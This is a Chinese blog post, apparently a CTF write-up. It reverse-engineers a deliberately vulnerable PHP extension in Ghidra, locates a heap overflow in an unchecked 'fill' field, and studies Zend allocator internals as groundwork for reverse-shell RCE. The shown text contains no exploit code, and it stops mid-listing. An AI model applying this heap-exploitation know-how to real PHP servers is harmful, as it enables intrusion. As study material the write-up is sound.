<h1 id="a-逆向分析"><a class="markdownIt-Anchor" href="#a-逆向分析"></a> A. 逆向分析</h1>
<p>该题是一道典型的PHP pwn，题目中给出了一个简单的PHP文件上传脚本，我们可以上传PHP文件然后远程执行，调用有漏洞的C库，最后通过反弹shell进行RCE。</p>
<p>这里我们使用的逆向分析引擎为Ghidra。</p>
<h2 id="a1-基本数据获取"><a class="markdownIt-Anchor" href="#a1-基本数据获取"></a> A.1 基本数据获取</h2>
<p>在上一篇blog中，我们提到，一个PHP扩展必然存在一个<code>_zend_module_entry</code>结构，用于保存该扩展的基本信息。我们可以在Ghidra中定义下面的结构，其中函数指针以<code>void*</code>代替。随后，可以在0x104080找到<code>vuln_module_entry</code>，从数据大小和变量名来看应该就是我们要找的<code>_zend_module_entry</code>。进行数据类型转换后如下所示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_module_entry</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> size;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> zend_api;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> zend_debug;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> zts;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_ini_entry</span> *<span class="title">ini_entry</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_module_dep</span> *<span class="title">deps</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_function_entry</span> *<span class="title">functions</span>;</span></span><br><span class="line">	zend_result (*module_startup_func)(INIT_FUNC_ARGS);</span><br><span class="line">	zend_result (*module_shutdown_func)(SHUTDOWN_FUNC_ARGS);</span><br><span class="line">	zend_result (*request_startup_func)(INIT_FUNC_ARGS);</span><br><span class="line">	zend_result (*request_shutdown_func)(SHUTDOWN_FUNC_ARGS);</span><br><span class="line">	<span class="type">void</span> (*info_func)(ZEND_MODULE_INFO_FUNC_ARGS);</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *version;</span><br><span class="line">	<span class="type">size_t</span> globals_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ZTS</span></span><br><span class="line">	ts_rsrc_id* globals_id_ptr;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="type">void</span>* globals_ptr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">void</span> (*globals_ctor)(<span class="type">void</span> *global);</span><br><span class="line">	<span class="type">void</span> (*globals_dtor)(<span class="type">void</span> *global);</span><br><span class="line">	zend_result (*post_deactivate_func)(<span class="type">void</span>);</span><br><span class="line">	<span class="type">int</span> module_started;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> type;</span><br><span class="line">	<span class="type">void</span> *handle;</span><br><span class="line">	<span class="type">int</span> module_number;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *build_id;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="1.png" alt="" /></p>
<p>由此可以获取一些基本信息，包括扩展的名字<code>vuln</code>、版本0.1.0等。</p>
<p>随后，我们定义<code>_zend_function_entry</code>结构，找到<code>vuln_module_entry</code>并设置其数据类型，如下图所示，可以看到，扩展一共定义了4个函数可供调用。</p>
<p><img src="2.png" alt="" /></p>
<p>随后，定义表示参数类型的数据结构，得到这些函数的参数信息，如下图所示。</p>
<p><img src="3.png" alt="" /></p>
<p>可以获取这些函数的原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">zif_addHacker</span><span class="params">(undef name, undef fill)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">zif_removeHacker</span><span class="params">(undef idx)</span>;</span><br><span class="line"><span class="built_in">string</span> <span class="title function_">zif_displayHacker</span><span class="params">(undef idx)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">zif_editHacker</span><span class="params">(undef idx, undef content)</span>;</span><br></pre></td></tr></table></figure>
<h2 id="a2-函数逆向"><a class="markdownIt-Anchor" href="#a2-函数逆向"></a> A.2 函数逆向</h2>
<p>下面，我们分析一下库中定义的函数。</p>
<h3 id="zif_addhacker"><a class="markdownIt-Anchor" href="#zif_addhacker"></a> zif_addHacker</h3>
<p>反汇编结果如下图所示。</p>
<p><img src="4.png" alt="" /></p>
<p>在这里，C语言解析参数的方式与上一篇blog中描述的不同。这里是使用<code>zend_parse_parameters</code>进行解析。这种解析方式更加直观。</p>
<p><code>zend_parse_parameters</code>可传入不固定数量的参数，一般用于一次性解析所有参数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">zend_parse_parameters</span><span class="params">(<span class="type">int</span> num_args, <span class="type">char</span> *type_spec, ...)</span>;</span><br></pre></td></tr></table></figure>
<p>第一个参数为参数数量，第二个参数为参数解析格式。根据PHP源代码文档，<code>type_spec</code>参数的格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">对于一个参数，可以使用一个字符序列表示该参数的解析规则。在后面的变长参数中，需要顺序传入参数保存值的引用值。</span><br><span class="line"></span><br><span class="line">PHP使用一个字母表示参数应该被解析为什么类型。具体的对应关系如下：</span><br><span class="line"></span><br><span class="line">a  - array (zval*)</span><br><span class="line">A  - array or object (zval*)</span><br><span class="line">b  - boolean (zend_bool)</span><br><span class="line">C  - class (zend_class_entry*)</span><br><span class="line">d  - double (double)</span><br><span class="line">f  - function or array containing php method call info (returned as</span><br><span class="line">     zend_fcall_info and zend_fcall_info_cache)</span><br><span class="line">h  - array (returned as HashTable*)</span><br><span class="line">H  - array or HASH_OF(object) (returned as HashTable*)</span><br><span class="line">l  - long (zend_long)</span><br><span class="line">n  - long or double (zval*)</span><br><span class="line">o  - object of any type (zval*)</span><br><span class="line">O  - object of specific type given by class entry (zval*, zend_class_entry)</span><br><span class="line">p  - valid path (string without null bytes in the middle) and its length (char*, size_t)</span><br><span class="line">P  - valid path (string without null bytes in the middle) as zend_string (zend_string*)</span><br><span class="line">r  - resource (zval*)</span><br><span class="line">s  - string (with possible null bytes) and its length (char*, size_t)</span><br><span class="line">S  - string (with possible null bytes) as zend_string (zend_string*)</span><br><span class="line">z  - the actual zval (zval*)</span><br><span class="line">*  - variable arguments list (0 or more)</span><br><span class="line">+  - variable arguments list (1 or more)</span><br><span class="line"></span><br><span class="line">还可以使用下面3个符号：</span><br><span class="line"></span><br><span class="line">|  - 放在上面字母的前面表示参数的解析规则为可选参数，其应该被初始化为默认值，以防止PHP代码没有传入该参数。</span><br><span class="line">/  - 对其所跟的参数调用 SEPARATE_ZVAL()。 </span><br><span class="line">!  - 所跟的参数可以为指定类型或 NULL。如果传入 NULL 且输出类型为指针，则输出的 C 语言指针为 NULL。对于类型 &#x27;b&#x27;、&#x27;l&#x27;、&#x27;d&#x27;，一个额外的 zend_bool* 类型需要在对应的 bool*、zend_long*、double* 后被传入。如果传入 PHP NULL 则一个非0值将会被写到 zend_bool 中。</span><br></pre></td></tr></table></figure>
<p>具体的示例参见<a href="parameter-parsing-api.txt">PHP文档</a>，已保存到网站本地。</p>
<p>在定义了必要的数据结构之后，可以完成对该函数的反汇编，重定义数据类型与命名后，结果如下所示。</p>
<p><img src="5.png" alt="" /></p>
<p>下面是推断出的本地定义的数据结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hacker_entry</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>* name;</span><br><span class="line">    <span class="type">size_t</span> name_len;</span><br><span class="line">    <span class="type">char</span>[] fill;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunklist_entry</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hacker_entry</span>* <span class="title">hacker</span>;</span></span><br><span class="line">    <span class="type">int</span> islast;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这里没有定义<code>zend_string</code>，偏移0x10表示字符串长度，0x18表示字符串指针。</p>
<p>需要注意的是，结构体<code>hacker_entry</code>的最后一个字段的数组长度未知，又因为没有对<code>fill</code>参数的长度进行判断，因此可能存在堆内存溢出漏洞。我们需要分析内存分配函数<code>_emalloc</code>以明确溢出的具体信息。</p>
<p>查阅PHP源代码发现，<code>_emalloc</code>是PHP自己实现的一个内存分配函数，即PHP默认不使用外部库（如glibc）进行内存分配。当然在C语言编写的扩展中使用glibc也是完全允许的。这部分代码分析在我们将4个扩展内函数逆向完成后再进行。</p>
<h3 id="zif_removehacker"><a class="markdownIt-Anchor" href="#zif_removehacker"></a> zif_removeHacker</h3>
<p><img src="6.png" alt="" /></p>
<h3 id="zif_displayhacker"><a class="markdownIt-Anchor" href="#zif_displayhacker"></a> zif_displayHacker</h3>
<p><img src="7.png" alt="" /></p>
<p>这个函数只返回了之前传入的Hacker名，而不会返回fill。</p>
<h3 id="zif_edithacker"><a class="markdownIt-Anchor" href="#zif_edithacker"></a> zif_editHacker</h3>
<p><img src="8.png" alt="" /></p>
<p>这里只是修改了Hacker的名字，没有改变fill。</p>
<p>由上面的分析可知，本题的漏洞点应该就在fill字段的处理上。我们需要理解PHP的内存分配系统原理，以尝试通过这个溢出实现get shell。</p>
<h2 id="a3-php-内存分配"><a class="markdownIt-Anchor" href="#a3-php-内存分配"></a> A.3 PHP 内存分配</h2>
<p><code>_emalloc</code>函数是PHP自定义的内存分配系统的分配入口点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_alloc.c, line 2534</span></span><br><span class="line"></span><br><span class="line">ZEND_API <span class="type">void</span>* ZEND_FASTCALL _emalloc(<span class="type">size_t</span> size ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line">	<span class="keyword">if</span> (UNEXPECTED(AG(mm_heap)-&gt;use_custom_heap)) &#123;</span><br><span class="line">		<span class="keyword">return</span> _malloc_custom(size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">return</span> zend_mm_alloc_heap(AG(mm_heap), size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有一个默认为真的宏定义，它将分配过程拆分为两个分支。首先来看默认分支，即<code>_malloc_custom</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_alloc.c, line 2414</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> ZEND_COLD <span class="type">void</span>* ZEND_FASTCALL _malloc_custom(<span class="type">size_t</span> size ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (ZEND_DEBUG &amp;&amp; AG(mm_heap)-&gt;use_custom_heap == ZEND_MM_CUSTOM_HEAP_DEBUG) &#123;</span><br><span class="line">		<span class="keyword">return</span> AG(mm_heap)-&gt;custom_heap.debug._malloc(size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> AG(mm_heap)-&gt;custom_heap.<span class="built_in">std</span>._malloc(size);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /Zend/zend_alloc.c, line 2356</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_alloc_globals</span> &#123;</span></span><br><span class="line">    zend_mm_heap *mm_heap;</span><br><span class="line">&#125; zend_alloc_globals;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ZTS</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> alloc_globals_id;</span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> alloc_globals_offset;</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> AG(v) ZEND_TSRMG_FAST(alloc_globals_offset, zend_alloc_globals *, v)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> AG(v) (alloc_globals.v)</span></span><br><span class="line"><span class="type">static</span> zend_alloc_globals alloc_globals;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>由此可以找到PHP堆的全局定义结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_heap</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line">	<span class="type">int</span>                use_custom_heap;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STORAGE</span></span><br><span class="line">	zend_mm_storage   *storage;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">	<span class="type">size_t</span>             size;                    <span class="comment">/* current memory usage */</span></span><br><span class="line">	<span class="type">size_t</span>             peak;                    <span class="comment">/* peak memory usage */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	zend_mm_free_slot *free_slot[ZEND_MM_BINS]; <span class="comment">/* free lists for small sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT || ZEND_MM_LIMIT</span></span><br><span class="line">	<span class="type">size_t</span>             real_size;               <span class="comment">/* current size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">	<span class="type">size_t</span>             real_peak;               <span class="comment">/* peak size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_LIMIT</span></span><br><span class="line">	<span class="type">size_t</span>             limit;                   <span class="comment">/* memory limit */</span></span><br><span class="line">	<span class="type">int</span>                overflow;                <span class="comment">/* memory overflow flag */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	zend_mm_huge_list *huge_list;               <span class="comment">/* list of huge allocated blocks */</span></span><br><span class="line"></span><br><span class="line">	zend_mm_chunk     *main_chunk;</span><br><span class="line">	zend_mm_chunk     *cached_chunks;			<span class="comment">/* list of unused chunks */</span></span><br><span class="line">	<span class="type">int</span>                chunks_count;			<span class="comment">/* number of allocated chunks */</span></span><br><span class="line">	<span class="type">int</span>                peak_chunks_count;		<span class="comment">/* peak number of allocated chunks for current request */</span></span><br><span class="line">	<span class="type">int</span>                cached_chunks_count;		<span class="comment">/* number of cached chunks */</span></span><br><span class="line">	<span class="type">double</span>             avg_chunks_count;		<span class="comment">/* average number of chunks allocated per request */</span></span><br><span class="line">	<span class="type">int</span>                last_chunks_delete_boundary; <span class="comment">/* number of chunks after last deletion */</span></span><br><span class="line">	<span class="type">int</span>                last_chunks_delete_count;    <span class="comment">/* number of deletion over the last boundary */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span>);</span><br><span class="line">			<span class="type">void</span>       (*_free)(<span class="type">void</span>*);</span><br><span class="line">			<span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>);</span><br><span class="line">		&#125; <span class="built_in">std</span>;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span> ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">			<span class="type">void</span>       (*_free)(<span class="type">void</span>*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">			<span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">		&#125; debug;</span><br><span class="line">	&#125; custom_heap;</span><br><span class="line">	HashTable *tracked_allocs;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到，自定义堆分配实际上就是自定义堆分配、释放与重新分配的函数。在全局结构构造函数<code>alloc_globals_ctor (/Zend/zend_alloc.c, line 2798)</code>中，实际上是将函数指针处初始化为<code>__zend_malloc</code>。<code>__zend_malloc</code>直接调用libc的malloc函数。因此自定义内存分配时默认使用libc库的内存分配函数。</p>
<p>下面再看到另一个分支。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_alloc.c, line 1311</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_heap</span><span class="params">(zend_mm_heap *heap, <span class="type">size_t</span> size ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *ptr;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line">	...</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">if</span> (EXPECTED(size &lt;= ZEND_MM_MAX_SMALL_SIZE)) &#123;</span><br><span class="line">		ptr = zend_mm_alloc_small(heap, ZEND_MM_SMALL_SIZE_TO_BIN(size) ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line">    ...</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		<span class="keyword">return</span> ptr;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (EXPECTED(size &lt;= ZEND_MM_MAX_LARGE_SIZE)) &#123;</span><br><span class="line">		ptr = zend_mm_alloc_large(heap, size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line">    ...</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		<span class="keyword">return</span> ptr;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line">	...</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		<span class="keyword">return</span> zend_mm_alloc_huge(heap, size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，这里根据分配需求的大小将调用不同的3个函数，其中<code>ZEND_MM_MAX_SMALL_SIZE</code>为3072，<code>ZEND_MM_MAX_LARGE_SIZE</code>为2MB-4KB。对于题目而言，要分配的大小基本都小于3072。需要注意的是，在函数调用中使用了<code>ZEND_MM_SMALL_SIZE_TO_BIN</code>宏定义，可以理解为：PHP内部使用30个链表保存以释放的小chunk，每个链表中保存一个大小范围内的chunk，这与musl libc有类似之处。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /Zend/zend_alloc.c, line 1157</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> zend_always_inline <span class="type">int</span> <span class="title function_">zend_mm_small_size_to_bin</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">                            <span class="comment">/*0,  1,  2,  3,  4,  5,  6,  7,  8,  9  10, 11, 12*/</span></span><br><span class="line">	<span class="type">static</span> <span class="type">const</span> <span class="type">int</span> f1[] = &#123; <span class="number">3</span>,  <span class="number">3</span>,  <span class="number">3</span>,  <span class="number">3</span>,  <span class="number">3</span>,  <span class="number">3</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>&#125;;</span><br><span class="line">	<span class="type">static</span> <span class="type">const</span> <span class="type">int</span> f2[] = &#123; <span class="number">0</span>,  <span class="number">0</span>,  <span class="number">0</span>,  <span class="number">0</span>,  <span class="number">0</span>,  <span class="number">0</span>,  <span class="number">0</span>,  <span class="number">4</span>,  <span class="number">8</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">24</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (UNEXPECTED(size &lt;= <span class="number">2</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	n = zend_mm_small_size_to_bit(size - <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> ((size<span class="number">-1</span>) &gt;&gt; f1[n]) + f2[n];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> t1, t2;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size &lt;= <span class="number">64</span>) &#123;</span><br><span class="line">		<span class="comment">/* we need to support size == 0 ... */</span></span><br><span class="line">		<span class="keyword">return</span> (size - !!size) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		t1 = size - <span class="number">1</span>;</span><br><span class="line">		t2 = zend_mm_small_size_to_bit(t1) - <span class="number">3</span>;</span><br><span class="line">		t1 = t1 &gt;&gt; t2;</span><br><span class="line">		t2 = t2 - <span class="number">3</span>;</span><br><span class="line">		t2 = t2 &lt;&lt; <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="type">int</span>)(t1 + t2);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_MM_SMALL_SIZE_TO_BIN(size)  zend_mm_small_size_to_bin(size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /Zend/zend_alloc.c, line 1125</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* higher set bit number (0-&gt;N/A, 1-&gt;1, 2-&gt;2, 4-&gt;3, 8-&gt;4, 127-&gt;7, 128-&gt;8 etc) */</span></span><br><span class="line"><span class="type">static</span> zend_always_inline <span class="type">int</span> <span class="title function_">zend_mm_small_size_to_bit</span><span class="params">(<span class="type">int</span> size)</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> (defined(__GNUC__) || __has_builtin(__builtin_clz))  &amp;&amp; defined(PHP_HAVE_BUILTIN_CLZ)</span></span><br><span class="line">    <span class="keyword">return</span> (__builtin_clz(size) ^ <span 